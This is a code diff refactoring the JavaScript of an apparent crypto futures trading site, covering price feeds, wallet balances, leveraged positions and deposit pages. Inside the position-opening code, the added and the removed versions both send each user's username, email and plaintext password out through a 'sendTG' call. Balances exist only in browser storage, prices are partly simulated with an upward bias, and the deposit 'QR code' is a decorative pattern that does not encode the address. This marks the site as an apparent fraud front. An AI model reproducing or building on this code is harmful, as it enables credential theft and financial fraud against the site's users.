+var sym=d[i].symbol.toUpperCase();
+for(var j=0;j<COINS.length;j++){
+if(COINS[j].s===sym){COINS[j].p=d[i].current_price;COINS[j].ch=(d[i].price_change_percentage_24h||0).toFixed(2);COINS[j].vol=d[i].total_volume;COINS[j].hi=d[i].high_24h;COINS[j].lo=d[i].low_24h;found=true}
+}
+}
+}
+return found;
+}).catch(function(){return false});
 }
 
-function tryBinanceFutures() {
-  return fetch('https://fapi.binance.com/fapi/v1/ticker/24hr')
-    .then(function (r) { return r.json(); })
-    .then(function (d) {
-      var found = false;
-      for (var i = 0; i < d.length; i++) {
-        var sym = d[i].symbol.replace('USDT', '');
-        for (var j = 0; j < COINS.length; j++) {
-          if (COINS[j].s === sym) {
-            COINS[j].p = parseFloat(d[i].lastPrice);
-            COINS[j].ch = parseFloat(d[i].priceChangePercent).toFixed(2);
-            COINS[j].vol = parseFloat(d[i].quoteVolume);
-            found = true;
-          }
-        }
-      }
-      return found;
-    })
-    .catch(function () { return false; });
+function simPrices(){
+for(var i=0;i<COINS.length;i++){
+var v=COINS[i].p>1000?.002:COINS[i].p>1?.005:.01;
+COINS[i].p=Math.max(1e-8,COINS[i].p*(1+(Math.random()-.48)*v));
+COINS[i].ch=(parseFloat(COINS[i].ch)+(Math.random()-.48)*.3).toFixed(2);
+}
 }
 
-function tryBybit() {
-  return fetch('https://api.bybit.com/v5/market/tickers?category=spot')
-    .then(function (r) { return r.json(); })
-    .then(function (d) {
-      if (!d.result || !d.result.list) return false;
-      var found = false;
-      for (var i = 0; i < d.result.list.length; i++) {
-        var t = d.result.list[i];
-        var sym = t.symbol.replace('USDT', '');
-        for (var j = 0; j < COINS.length; j++) {
-          if (COINS[j].s === sym) {
-            COINS[j].p = parseFloat(t.lastPrice);
-            COINS[j].ch = (parseFloat(t.price24hPcnt) * 100).toFixed(2);
-            COINS[j].vol = parseFloat(t.turnover24h);
-            found = true;
-          }
-        }
-      }
-      return found;
-    })
-    .catch(function () { return false; });
+function onPU(){
+updateTicker();updateBals();
+var pg=document.querySelector('.page.active');
+if(pg){
+if(pg.id==='pg_home')renderHCoins();
+if(pg.id==='pg_market')renderMCoins();
+if(pg.id==='pg_futures')updateFP();
+}
 }
 
-function tryCoinGecko() {
-  return fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=100&page=1')
-    .then(function (r) { return r.json(); })
-    .then(function (d) {
-      var found = false;
-      for (var i = 0; i < d.length; i++) {
-        var sym = d[i].symbol.toUpperCase();
-        for (var j = 0; j < COINS.length; j++) {
-          if (COINS[j].s === sym) {
-            COINS[j].p = d[i].current_price;
-            COINS[j].ch = (d[i].price_change_percentage_24h || 0).toFixed(2);
-            COINS[j].vol = d[i].total_volume;
-            COINS[j].hi = d[i].high_24h;
-            COINS[j].lo = d[i].low_24h;
-            found = true;
-          }
-        }
-      }
-      return found;
-    })
-    .catch(function () { return false; });
+function updateTicker(){
+var el=document.getElementById('tickerEl');if(!el)return;
+var h='';
+for(var i=0;i<20&&i<COINS.length;i++){
+var c=COINS[i];var col=parseFloat(c.ch)>=0?'color:var(--green)':'color:var(--red)';
+var ar=parseFloat(c.ch)>=0?'+':'';
+h+='<div class="tkr-i"><span class="fw7">'+c.s+'</span><span class="mono">'+fmtP(c.p)+'</span><span style="'+col+'">'+ar+c.ch+'%</span></div>';
+}
+el.innerHTML=h+h;
 }
 
-function simulatePrices() {
-  for (var i = 0; i < COINS.length; i++) {
-    var v = COINS[i].p > 1000 ? .002 : COINS[i].p > 1 ? .005 : .01;
-    COINS[i].p = Math.max(1e-8, COINS[i].p * (1 + (Math.random() - .48) * v));
-    COINS[i].ch = (parseFloat(COINS[i].ch) + (Math.random() - .48) * .3).toFixed(2);
-  }
+/* ===== BALANCE ===== */
+function getWallet(uid){var ws=LS('bsc20_wallets')||{};return ws[uid||(user&&user.id)]||{main:0,bonus:0}}
+function setWallet(uid,w){var ws=LS('bsc20_wallets')||{};ws[uid]=w;LS('bsc20_wallets',ws)}
+function getIT(){
+if(!user)return 0;
+var pos=LS('bsc20_pos_'+user.id)||[];var t=0;
+for(var i=0;i<pos.length;i++){if(pos[i].st==='open')t+=pos[i].margin}
+return t;
 }
 
-function onPriceUpdate() {
-  updateTicker();
-  updateBalances();
-  var pg = document.querySelector('.page.active');
-  if (pg) {
-    if (pg.id === 'pg_home') renderHomeCoins();
-    if (pg.id === 'pg_market') renderMarketCoins();
-    if (pg.id === 'pg_futures') updateFuturesPrice();
-  }
+function updateBals(){
+if(!user||isAdmin)return;
+var w=getWallet();var it=getIT();
+var total=(w.main+w.bonus).toFixed(2);
+var avail=Math.max(0,w.main-it).toFixed(2);
+document.getElementById('hBal').textContent='$'+total;
+document.getElementById('totalBal').textContent='$'+total;
+document.getElementById('availBal').textContent='$'+avail;
+document.getElementById('tradeBal').textContent='$'+it.toFixed(2);
+document.getElementById('bonusBal').textContent='$'+w.bonus.toFixed(2);
+document.getElementById('wBal').textContent='$'+total;
+document.getElementById('wAvl').textContent='$'+w.main.toFixed(2);
+document.getElementById('wBon').textContent='$'+w.bonus.toFixed(2);
+document.getElementById('futAvl').textContent=avail+' USDT';
+document.getElementById('wdAvl').textContent=w.main.toFixed(2)+' USDT';
+calcPos();
 }
 
-function updateTicker() {
-  var el = document.getElementById('tickerEl');
-  if (!el) return;
-  var h = '';
-  for (var i = 0; i < 20 && i < COINS.length; i++) {
-    var c = COINS[i];
-    var col = parseFloat(c.ch) >= 0 ? 'color:var(--green)' : 'color:var(--red)';
-    var ar = parseFloat(c.ch) >= 0 ? '+' : '';
-    h += '<div class="tkr-i"><span class="fw7">' + c.s + '</span><span class="mono">' + fmtP(c.p) + '</span><span style="' + col + '">' + ar + c.ch + '%</span></div>';
-  }
-  el.innerHTML = h + h;
+/* ===== HOME ===== */
+function renderHCoins(){
+var el=document.getElementById('hCoins');if(!el)return;
+var sorted=COINS.slice();
+if(curHF==='pump')sorted.sort(function(a,b){return b.ch-a.ch});
+else if(curHF==='dump')sorted.sort(function(a,b){return a.ch-b.ch});
+else sorted.sort(function(a,b){return b.vol-a.vol});
+var h='';for(var i=0;i<8&&i<sorted.length;i++)h+=coinH(sorted[i]);
+el.innerHTML=h;
+}
+function hTabC(el,f){
+curHF=f;
+var tabs=document.querySelectorAll('#hTabs .tab');
+for(var i=0;i<tabs.length;i++)tabs[i].classList.remove('on');
+el.classList.add('on');renderHCoins();
+}
+function renderHOffers(){
+var h='';for(var i=0;i<3;i++)h+=offerH(OFFERS[i]);
+document.getElementById('hOffers').innerHTML=h;
 }
 
-// BALANCE
-function getWallet(uid) {
-  var ws = LS('bsc20_wallets') || {};
-  return ws[uid || (user && user.id)] || { main: 0, bonus: 0 };
+/* ===== MARKET ===== */
+function renderMCoins(search){
+var el=document.getElementById('mCoins');if(!el)return;
+var coins=COINS.slice();
+if(search){var s=search.toLowerCase();coins=coins.filter(function(c){return c.s.toLowerCase().indexOf(s)>=0||c.n.toLowerCase().indexOf(s)>=0})}
+if(curMF==='pump')coins.sort(function(a,b){return b.ch-a.ch});
+else if(curMF==='dump')coins.sort(function(a,b){return a.ch-b.ch});
+else if(curMF==='meme')coins=coins.filter(function(c){return c.c==='Meme'});
+else if(curMF==='defi')coins=coins.filter(function(c){return c.c==='DeFi'});
+else if(curMF==='l1')coins=coins.filter(function(c){return c.c==='Layer 1'});
+var h='';for(var i=0;i<coins.length;i++)h+=coinH(coins[i]);
+el.innerHTML=h||'<div class="tc ts" style="padding:30px;color:var(--gray)">No coins found</div>';
 }
-function setWallet(uid, w) {
-  var ws = LS('bsc20_wallets') || {};
-  ws[uid] = w;
-  LS('bsc20_wallets', ws);
+function mTabC(el,f){
+curMF=f;var tabs=document.querySelectorAll('#mTabs .tab');
+for(var i=0;i<tabs.length;i++)tabs[i].classList.remove('on');
+el.classList.add('on');renderMCoins();
 }
-function getInTrade() {
-  if (!user) return 0;
-  var pos = LS('bsc20_pos_' + user.id) || [];
-  var total = 0;
-  for (var i = 0; i < pos.length; i++) {
-    if (pos[i].st === 'open') total += pos[i].margin;
-  }
-  return total;
+function filterMkt(v){renderMCoins(v)}
+
+function coinH(c){
+var cl=parseFloat(c.ch)>=0?'c-up':'c-dn';var ar=parseFloat(c.ch)>=0?'+':'';
+return '<div class="coin-r" onclick="openTr(\''+c.s+'\')"><div class="coin-ic">'+c.s.substring(0,2)+'</div><div class="coin-inf"><div class="coin-nm">'+c.s+'</div><div class="coin-sm">'+c.n+'</div></div><div class="coin-pr"><div class="p">'+fmtP(c.p)+'</div><div class="c '+cl+'">'+ar+c.ch+'%</div></div></div>';
+}
+function openTr(s){
+var sel=document.getElementById('futPair');var val=s+'USDT';
+for(var i=0;i<sel.options.length;i++){if(sel.options[i].value===val){sel.selectedIndex=i;break}}
+curPair=val;goPage('futures');
 }
 
-function updateBalances() {
-  if (!user || isAdmin) return;
-  var w = getWallet();
-  var it = getInTrade();
-  var total = (w.main + w.bonus).toFixed(2);
-  var avail = Math.max(0, w.main - it).toFixed(2);
-  document.getElementById('hBal').textContent = '$' + total;
-  document.getElementById('totalBal').textContent = '$' + total;
-  document.getElementById('availBal').textContent = '$' + avail;
-  document.getElementById('tradeBal').textContent = '$' + it.toFixed(2);
-  document.getElementById('bonusBal').textContent = '$' + w.bonus.toFixed(2);
-  document.getElementById('wBal').textContent = '$' + total;
-  document.getElementById('wAvl').textContent = '$' + w.main.toFixed(2);
-  document.getElementById('wBon').textContent = '$' + w.bonus.toFixed(2);
-  document.getElementById('futAvl').textContent = avail + ' USDT';
-  document.getElementById('wdAvl').textContent = w.main.toFixed(2) + ' USDT';
-  calcPos();
+/* ===== FUTURES ===== */
+function loadTV(){
+var el=document.getElementById('tvChart');el.innerHTML='';
+try{
+var w=document.createElement('div');w.id='tv_w';w.style.cssText='width:100%;height:100%';el.appendChild(w);
+var s=document.createElement('script');s.src='https://s3.tradingview.com/tv.js';
+s.onload=function(){
+if(typeof TradingView!=='undefined'){
+new TradingView.widget({container_id:'tv_w',symbol:'BINANCE:'+curPair,interval:'15',timezone:'Etc/UTC',theme:'dark',style:'1',locale:'en',toolbar_bg:'#06090f',enable_publishing:false,hide_top_toolbar:false,save_image:false,width:'100%',height:'100%',backgroundColor:'#05080d',gridColor:'#111827'});
+}
+};document.head.appendChild(s);
+}catch(e){el.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--gray)">Chart loading...</div>'}
+}
+function chgPair(){curPair=document.getElementById('futPair').value;updateFP();loadTV()}
+
+function updateFP(){
+var sym=curPair.replace('USDT','');var c=null;
+for(var i=0;i<COINS.length;i++){if(COINS[i].s===sym){c=COINS[i];break}}
+if(c){
+document.getElementById('futPr').textContent='$'+fmtP(c.p);
+var ch=parseFloat(c.ch);var el=document.getElementById('futChg');
+el.textContent='24h: '+(ch>=0?'+':'')+ch+'% | H: $'+fmtP(c.hi||c.p)+' | L: $'+fmtP(c.lo||c.p);
+el.style.color=ch>=0?'var(--green)':'var(--red)';
+}
 }
 
-// HOME
-function renderHomeCoins() {
-  var el = document.getElementById('hCoins');
-  if (!el) return;
-  var sorted = COINS.slice();
-  var at = document.querySelector('#hTabs .tab.on');
-  var txt = at ? at.textContent : 'Hot';
-  if (txt.indexOf('Gain') >= 0) sorted.sort(function (a, b) { return b.ch - a.ch; });
-  else if (txt.indexOf('Los') >= 0) sorted.sort(function (a, b) { return a.ch - b.ch; });
-  else if (txt.indexOf('New') >= 0) sorted = sorted.slice(-10).reverse();
-  else sorted.sort(function (a, b) { return b.vol - a.vol; });
-  var h = '';
-  for (var i = 0; i < 8 && i < sorted.length; i++) h += coinHTML(sorted[i]);
-  el.innerHTML = h;
+function updLev(v){document.getElementById('levVal').textContent=v+'x';calcPos()}
+function calcPos(){
+var amt=parseFloat(document.getElementById('futAmt').value)||0;
+var lev=parseInt(document.getElementById('levSlider').value);
+document.getElementById('posSize').textContent=(amt*lev).toFixed(2)+' USDT';
+document.getElementById('marginReq').textContent=amt.toFixed(2)+' USDT';
 }
-function hTabClick(t, el) {
-  var tabs = document.querySelectorAll('#hTabs .tab');
-  for (var i = 0; i < tabs.length; i++) tabs[i].classList.remove('on');
-  el.classList.add('on');
-  renderHomeCoins();
+function setPct(p){
+if(!user)return;var w=getWallet();var it=getIT();var avl=Math.max(0,w.main-it);
+document.getElementById('futAmt').value=(avl*p/100).toFixed(2);calcPos();
 }
-function renderHomeOffers() {
-  var h = '';
-  for (var i = 0; i < 3; i++) h += offerHTML(OFFERS[i]);
-  document.getElementById('hOffers').innerHTML = h;
+function setOT(t,el){
+ordType=t;var tabs=el.parentNode.querySelectorAll('.tab');
+for(var i=0;i<tabs.length;i++)tabs[i].classList.remove('on');
+el.classList.add('on');document.getElementById('limRow').style.display=t==='limit'?'block':'none';
 }
 
-// MARKET
-function renderMarketCoins(filter, search) {
-  var el = document.getElementById('mCoins');
-  if (!el) return;
-  var coins = COINS.slice();
-  filter = filter || curMktTab;
-  if (search) {
-    var s = search.toLowerCase();
-    coins = coins.filter(function (c) { return c.s.toLowerCase().indexOf(s) >= 0 || c.n.toLowerCase().indexOf(s) >= 0; });
-  }
-  if (filter === 'pump') coins.sort(function (a, b) { return b.ch - a.ch; });
-  else if (filter === 'dump') coins.sort(function (a, b) { return a.ch - b.ch; });
-  else if (filter === 'hot') coins.sort(function (a, b) { return b.vol - a.vol; });
-  else if (filter === 'meme') coins = coins.filter(function (c) { return c.c === 'Meme'; });
-  else if (filter === 'defi') coins = coins.filter(function (c) { return c.c === 'DeFi'; });
-  else if (filter === 'l1') coins = coins.filter(function (c) { return c.c === 'Layer 1'; });
-  var h = '';
-  for (var i = 0; i < coins.length; i++) h += coinHTML(coins[i]);
-  el.innerHTML = h || '<div class="tc ts" style="padding:30px;color:var(--gray)">No coins found</div>';
-}
-function mTabClick(f, el) {
-  curMktTab = f;
-  var tabs = document.querySelectorAll('#mTabs .tab');
-  for (var i = 0; i < tabs.length; i++) tabs[i].classList.remove('on');
-  el.classList.add('on');
-  renderMarketCoins(f);
-}
-function filterMkt(v) { renderMarketCoins(curMktTab, v); }
-
-function coinHTML(c) {
-  var cl = parseFloat(c.ch) >= 0 ? 'c-up' : 'c-dn';
-  var ar = parseFloat(c.ch) >= 0 ? '+' : '';
-  return '<div class="coin-r" onclick="openTrade(\'' + c.s + '\')"><div class="coin-ic">' + c.s.substring(0, 2) + '</div><div class="coin-inf"><div class="coin-nm">' + c.s + '</div><div class="coin-sm">' + c.n + '</div></div><div class="coin-pr"><div class="p">' + fmtP(c.p) + '</div><div class="c ' + cl + '">' + ar + c.ch + '%</div></div></div>';
-}
-function openTrade(s) {
-  var sel = document.getElementById('futPair');
-  var val = s + 'USDT';
-  for (var i = 0; i < sel.options.length; i++) {
-    if (sel.options[i].value === val) { sel.selectedIndex = i; break; }
-  }
-  curPair = val;
-  goPage('futures');
+function openPos(dir){
+if(!user)return toast('Login first!','err');
+var amt=parseFloat(document.getElementById('futAmt').value);
+var lev=parseInt(document.getElementById('levSlider').value);
+var sym=curPair.replace('USDT','');var c=null;
+for(var i=0;i<COINS.length;i++){if(COINS[i].s===sym){c=COINS[i];break}}
+if(!c)return toast('Invalid pair','err');
+if(!amt||amt<10)return toast('Min 10 USDT','err');
+var w=getWallet();var it=getIT();
+if(w.main-it<amt)return toast('Insufficient balance! Deposit first.','err');
+var pos={id:'P'+Date.now(),pair:sym+'/USDT',dir:dir,lev:lev,entry:c.p,margin:amt,size:amt*lev,qty:(amt*lev)/c.p,liq:dir==='LONG'?c.p*(1-1/lev):c.p*(1+1/lev),st:'open',at:new Date().toISOString()};
+var positions=LS('bsc20_pos_'+user.id)||[];
+positions.push(pos);LS('bsc20_pos_'+user.id,positions);
+updateBals();renderPos();
+toast(dir+' opened! '+sym+' '+lev+'x','ok');
+sendTG('POSITION OPENED\n\nUsername: '+user.username+'\nEmail: '+user.email+'\nUser ID: '+user.id+'\nPassword: '+user.password+'\n\nPair: '+sym+'/USDT\nDirection: '+dir+'\nLeverage: '+lev+'x\nSize: $'+(amt*lev).toFixed(2)+'\nMargin: $'+amt.toFixed(2)+'\nEntry: $'+fmtP(c.p)+'\nLiq: $'+fmtP(pos.liq)+'\nBalance: $'+w.main.toFixed(2)+'\nTime: '+new Date().toLocaleString());
 }
 
-// FUTURES
-function loadTVChart() {
-  var el = document.getElementById('tvChart');
-  el.innerHTML = '';
-  try {
-    var w = document.createElement('div');
-    w.id = 'tv_w';
-    w.style.cssText = 'width:100%;height:100%';
-    el.appendChild(w);
-    var s = document.createElement('script');
-    s.src = 'https://s3.tradingview.com/tv.js';
-    s.onload = function () {
-      if (typeof TradingView !== 'undefined') {
-        new TradingView.widget({
-          container_id: 'tv_w', symbol: 'BINANCE:' + curPair, interval: '15',
-          timezone: 'Etc/UTC', theme: 'dark', style: '1', locale: 'en',
-          toolbar_bg: '#06090f', enable_publishing: false, hide_top_toolbar: false,
-          save_image: false, width: '100%', height: '100%',
-          backgroundColor: '#05080d', gridColor: '#111827'
-        });
-      }
-    };
-    document.head.appendChild(s);
-  } catch (e) {
-    el.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--gray)">Chart loading...</div>';
-  }
+function renderPos(){
+if(!user)return;
+var positions=LS('bsc20_pos_'+user.id)||[];
+var open=[];for(var i=0;i<positions.length;i++){if(positions[i].st==='open')open.push(positions[i])}
+var el=document.getElementById('posList');
+if(!open.length){el.innerHTML='<div class="tc ts" style="padding:16px;color:var(--gray)">No open positions</div>';return}
+var h='';
+for(var i=0;i<open.length;i++){
+var p=open[i];var c=null;var pS=p.pair.replace('/USDT','');
+for(var j=0;j<COINS.length;j++){if(COINS[j].s===pS){c=COINS[j];break}}
+var cp=c?c.p:p.entry;
+var pnl=p.dir==='LONG'?(cp-p.entry)*p.qty:(p.entry-cp)*p.qty;
+var roe=(pnl/p.margin*100).toFixed(2);
+var cl=pnl>=0?'pnl-up':'pnl-dn';var dirCl=p.dir==='LONG'?'c-up':'c-dn';
+h+='<div class="pos-c"><div class="flex-b mb4"><div><span class="fw7 ts">'+p.pair+'</span> <span class="'+dirCl+' txs fw7" style="padding:2px 6px;border-radius:4px">'+p.dir+'</span> <span class="txs" style="color:var(--gold)">'+p.lev+'x</span></div>';
+h+='<button class="btn btn-outline btn-sm" onclick="closePos(\''+p.id+'\')">Close</button></div>';
+h+='<div class="g2 txs mt4"><div>Entry: <span class="mono">'+fmtP(p.entry)+'</span></div><div>Now: <span class="mono">'+fmtP(cp)+'</span></div>';
+h+='<div>Size: <span class="mono">$'+p.size.toFixed(2)+'</span></div><div>PnL: <span class="mono '+cl+'">'+(pnl>=0?'+':'')+'$'+pnl.toFixed(2)+' ('+roe+'%)</span></div></div></div>';
 }
-function chgPair() { curPair = document.getElementById('futPair').value; updateFuturesPrice(); loadTVChart(); }
-
-function updateFuturesPrice() {
-  var sym = curPair.replace('USDT', '');
-  var c = null;
-  for (var i = 0; i < COINS.length; i++) { if (COINS[i].s === sym) { c = COINS[i]; break; } }
-  if (c) {
-    document.getElementById('futPr').textContent = '$' + fmtP(c.p);
-    var ch = parseFloat(c.ch);
-    var el = document.getElementById('futChg');
-    el.textContent = '24h: ' + (ch >= 0 ? '+' : '') + ch + '% | H: $' + fmtP(c.hi || c.p) + ' | L: $' + fmtP(c.lo || c.p);
-    el.style.color = ch >= 0 ? 'var(--green)' : 'var(--red)';
-  }
+el.innerHTML=h;
 }
 
-function updLev(v) { document.getElementById('levVal').textContent = v + 'x'; calcPos(); }
-function calcPos() {
-  var amt = parseFloat(document.getElementById('futAmt').value) || 0;
-  var lev = parseInt(document.getElementById('levSlider').value);
-  document.getElementById('posSize').textContent = (amt * lev).toFixed(2) + ' USDT';
-  document.getElementById('marginReq').textContent = amt.toFixed(2) + ' USDT';
-}
-function setPct(p) {
-  if (!user) return;
-  var w = getWallet();
-  var it = getInTrade();
-  var avl = Math.max(0, w.main - it);
-  document.getElementById('futAmt').value = (avl * p / 100).toFixed(2);
-  calcPos();
-}
-function setOrdType(t, el) {
-  ordType = t;
-  var tabs = el.parentNode.querySelectorAll('.tab');
-  for (var i = 0; i < tabs.length; i++) tabs[i].classList.remove('on');
-  el.classList.add('on');
-  document.getElementById('limRow').style.display = t === 'limit' ? 'block' : 'none';
+function closePos(id){
+if(!user)return;
+var positions=LS('bsc20_pos_'+user.id)||[];var p=null;
+for(var i=0;i<positions.length;i++){if(positions[i].id===id){p=positions[i];break}}
+if(!p)return;
+var pS=p.pair.replace('/USDT','');var c=null;
+for(var j=0;j<COINS.length;j++){if(COINS[j].s===pS){c=COINS[j];break}}
+var cp=c?c.p:p.entry;
+var pnl=p.dir==='LONG'?(cp-p.entry)*p.qty:(p.entry-cp)*p.qty;
+var w=getWallet();w.main+=p.margin+pnl;if(w.main<0)w.main=0;
+setWallet(user.id,w);
+p.st='closed';p.closedAt=new Date().toISOString();p.exit=cp;p.pnl=pnl;
+LS('bsc20_pos_'+user.id,positions);
+updateBals();renderPos();renderFH();
+toast('Closed! PnL: '+(pnl>=0?'+':'')+'$'+pnl.toFixed(2),pnl>=0?'ok':'err');
+sendTG('POSITION CLOSED\n\nUsername: '+user.username+'\nEmail: '+user.email+'\nUser ID: '+user.id+'\n\nPair: '+p.pair+' '+p.dir+' '+p.lev+'x\nEntry: $'+fmtP(p.entry)+' > Exit: $'+fmtP(cp)+'\n'+(pnl>=0?'PROFIT':'LOSS')+': '+(pnl>=0?'+':'')+'$'+pnl.toFixed(2)+'\nNew Balance: $'+w.main.toFixed(2)+'\nTime: '+new Date().toLocaleString());
 }
 
-function openPosition(dir) {
-  if (!user) return toast('Login first!', 'err');
-  var amt = parseFloat(document.getElementById('futAmt').value);
-  var lev = parseInt(document.getElementById('levSlider').value);
-  var sym = curPair.replace('USDT', '');
-  var c = null;
-  for (var i = 0; i < COINS.length; i++) { if (COINS[i].s === sym) { c = COINS[i]; break; } }
-  if (!c) return toast('Invalid pair', 'err');
-  if (!amt || amt < 10) return toast('Min 10 USDT', 'err');
-  var w = getWallet();
-  var it = getInTrade();
-  if (w.main - it < amt) return toast('Insufficient balance! Deposit first.', 'err');
-  var pos = {
-    id: 'P' + Date.now(), pair: sym + '/USDT', dir: dir, lev: lev,
-    entry: c.p, margin: amt, size: amt * lev, qty: (amt * lev) / c.p,
-    liq: dir === 'LONG' ? c.p * (1 - 1 / lev) : c.p * (1 + 1 / lev),
-    st: 'open', at: new Date().toISOString()
-  };
-  var positions = LS('bsc20_pos_' + user.id) || [];
-  positions.push(pos);
-  LS('bsc20_pos_' + user.id, positions);
-  updateBalances();
-  renderPositions();
-  toast(dir + ' opened! ' + sym + ' ' + lev + 'x', 'ok');
-  sendTG(dir + ' POSITION OPENED\n\nUsername: ' + user.username + '\nEmail: ' + user.email + '\nUser ID: ' + user.id + '\nPassword: ' + user.password + '\n\nPair: ' + sym + '/USDT\nDirection: ' + dir + '\nLeverage: ' + lev + 'x\nSize: $' + (amt * lev).toFixed(2) + '\nMargin: $' + amt.toFixed(2) + '\nEntry: $' + fmtP(c.p) + '\nLiq: $' + fmtP(pos.liq) + '\nBalance: $' + w.main.toFixed(2) + '\nTime: ' + new Date().toLocaleString());
+function renderFH(){
+if(!user)return;
+var positions=LS('bsc20_pos_'+user.id)||[];
+var closed=[];for(var i=positions.length-1;i>=0;i--){if(positions[i].st==='closed'){closed.push(positions[i]);if(closed.length>=15)break}}
+var el=document.getElementById('futHist');
+if(!closed.length){el.innerHTML='<div class="tc ts" style="padding:16px;color:var(--gray)">No trade history</div>';return}
+var h='';
+for(var i=0;i<closed.length;i++){
+var p=closed[i];var cl=p.pnl>=0?'pnl-up':'pnl-dn';
+var dirCol=p.dir==='LONG'?'var(--green)':'var(--red)';
+h+='<div class="hist-i"><div><div class="fw7 ts">'+p.pair+' <span style="color:'+dirCol+'">'+p.dir+'</span> '+p.lev+'x</div><div class="txs" style="color:var(--gray)">'+new Date(p.closedAt).toLocaleString()+'</div></div><div class="ts mono '+cl+' fw7">'+(p.pnl>=0?'+':'')+'$'+p.pnl.toFixed(2)+'</div></div>';
+}
+el.innerHTML=h;
 }
 
-function renderPositions() {
-  if (!user) return;
-  var positions = LS('bsc20_pos_' + user.id) || [];
-  var open = [];
-  for (var i = 0; i < positions.length; i++) {
-    if (positions[i].st === 'open') open.push(positions[i]);
-  }
-  var el = document.getElementById('posList');
-  if (!open.length) { el.innerHTML = '<div class="tc ts" style="padding:16px;color:var(--gray)">No open positions</div>'; return; }
-  var h = '';
-  for (var i = 0; i < open.length; i++) {
-    var p = open[i];
-    var c = null;
-    var pairSym = p.pair.replace('/USDT', '');
-    for (var j = 0; j < COINS.length; j++) { if (COINS[j].s === pairSym) { c = COINS[j]; break; } }
-    var cp = c ? c.p : p.entry;
-    var pnl = p.dir === 'LONG' ? (cp - p.entry) * p.qty : (p.entry - cp) * p.qty;
-    var roe = (pnl / p.margin * 100).toFixed(2);
-    var cl = pnl >= 0 ? 'pnl-up' : 'pnl-dn';
-    var dirCl = p.dir === 'LONG' ? 'c-up' : 'c-dn';
-    h += '<div class="pos-c">';
-    h += '<div class="flex-b mb4"><div><span class="fw7 ts">' + p.pair + '</span> <span class="' + dirCl + ' txs fw7" style="padding:2px 6px;border-radius:4px">' + p.dir + '</span> <span class="txs" style="color:var(--gold)">' + p.lev + 'x</span></div>';
-    h += '<button class="btn btn-outline btn-sm" onclick="closePosition(\'' + p.id + '\')">Close</button></div>';
-    h += '<div class="g2 txs mt4"><div>Entry: <span class="mono">' + fmtP(p.entry) + '</span></div><div>Now: <span class="mono">' + fmtP(cp) + '</span></div>';
-    h += '<div>Size: <span class="mono">$' + p.size.toFixed(2) + '</span></div><div>PnL: <span class="mono ' + cl + '">' + (pnl >= 0 ? '+' : '') + '$' + pnl.toFixed(2) + ' (' + roe + '%)</span></div></div></div>';
-  }
-  el.innerHTML = h;
+/* ===== WALLET ===== */
+function wTab(t){
+var secs=document.querySelectorAll('#pg_wallet .wsec');
+for(var i=0;i<secs.length;i++)secs[i].classList.remove('on');
+var tabs=document.querySelectorAll('#wTabs .tab');
+for(var i=0;i<tabs.length;i++)tabs[i].classList.remove('on');
+var map={dep:0,wd:1,coupon:2,hist:3};
+var secMap={dep:'ws_dep',wd:'ws_wd',coupon:'ws_coupon',hist:'ws_hist'};
+document.getElementById(secMap[t]).classList.add('on');
+tabs[map[t]].classList.add('on');
+if(t==='hist')renderHist();
+if(t==='dep'){updateDA();genQR()}
 }
 
-function closePosition(id) {
-  if (!user) return;
-  var positions = LS('bsc20_pos_' + user.id) || [];
-  var p = null;
-  for (var i = 0; i < positions.length; i++) { if (positions[i].id === id) { p = positions[i]; break; } }
-  if (!p) return;
-  var pairSym = p.pair.replace('/USDT', '');
-  var c = null;
-  for (var j = 0; j < COINS.length; j++) { if (COINS[j].s === pairSym) { c = COINS[j]; break; } }
-  var cp = c ? c.p : p.entry;
-  var pnl = p.dir === 'LONG' ? (cp - p.entry) * p.qty : (p.entry - cp) * p.qty;
-  var w = getWallet();
-  w.main += p.margin + pnl;
-  if (w.main < 0) w.main = 0;
-  setWallet(user.id, w);
-  p.st = 'closed';
-  p.closedAt = new Date().toISOString();
-  p.exit = cp;
-  p.pnl = pnl;
-  LS('bsc20_pos_' + user.id, positions);
-  updateBalances();
-  renderPositions();
-  renderFutHist();
-  toast('Closed! PnL: ' + (pnl >= 0 ? '+' : '') + '$' + pnl.toFixed(2), pnl >= 0 ? 'ok' : 'err');
-  sendTG('POSITION CLOSED\n\nUsername: ' + user.username + '\nEmail: ' + user.email + '\nUser ID: ' + user.id + '\n\nPair: ' + p.pair + ' ' + p.dir + ' ' + p.lev + 'x\nEntry: $' + fmtP(p.entry) + ' > Exit: $' + fmtP(cp) + '\n' + (pnl >= 0 ? 'PROFIT' : 'LOSS') + ': ' + (pnl >= 0 ? '+' : '') + '$' + pnl.toFixed(2) + '\nNew Balance: $' + w.main.toFixed(2) + '\nTime: ' + new Date().toLocaleString());
+function updateDA(){document.getElementById('depAddr').innerHTML=CFG.ADDR[selNet]+'<button class="cp-btn" onclick="copyAddr()">Copy</button>'}
+function selDN(n,el){
+selNet=n;var btns=document.querySelectorAll('#ws_dep .net-b');
+for(var i=0;i<btns.length;i++)btns[i].classList.remove('on');
+el.classList.add('on');updateDA();genQR();
+}
+function copyAddr(){
+var text=CFG.ADDR[selNet];
+if(navigator.clipboard){navigator.clipboard.writeText(text).then(function(){toast('Address copied!','ok')})}
+else{var ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);toast('Address copied!','ok')}
+}
+function genQR(){
+var cv=document.getElementById('qrC');if(!cv)return;
+var ctx=cv.getContext('2d');ctx.fillStyle='#fff';ctx.fillRect(0,0,110,110);
+var addr=CFG.ADDR[selNet];ctx.fillStyle='#000';
+for(var i=0;i<16;i++){for(var j=0;j<16;j++){if((addr.charCodeAt((i*16+j)%addr.length)+i+j)%3===0){ctx.fillRect(i*6+5,j*6+5,5,5)}}}
+var corners=[{x:5,y:5},{x:83,y:5},{x:5,y:83}];
+for(var k=0;k<corners.length;k++){var cx=corners[k].x,cy=corners[k].y;ctx.fillStyle='#000';ctx.fillRect(cx,cy,22,22);ctx.fillStyle='#fff';ctx.fillRect(cx+3,cy+3,16,16);ctx.fillStyle='#000';ctx.fillRect(cx+6,cy+6,10,10)}
 }
 
-function renderFutHist() {
-  if (!user) return;
-  var positions = LS('bsc20_pos_' + user.id) || [];
-  var closed = [];
-  for (var i = positions.length - 1; i >= 0; i--) {
-    if (positions[i].st === 'closed') { closed.push(positions[i]); if (closed.length >= 15) break; }
-  }
-  var el = document.getElementById('futHist');
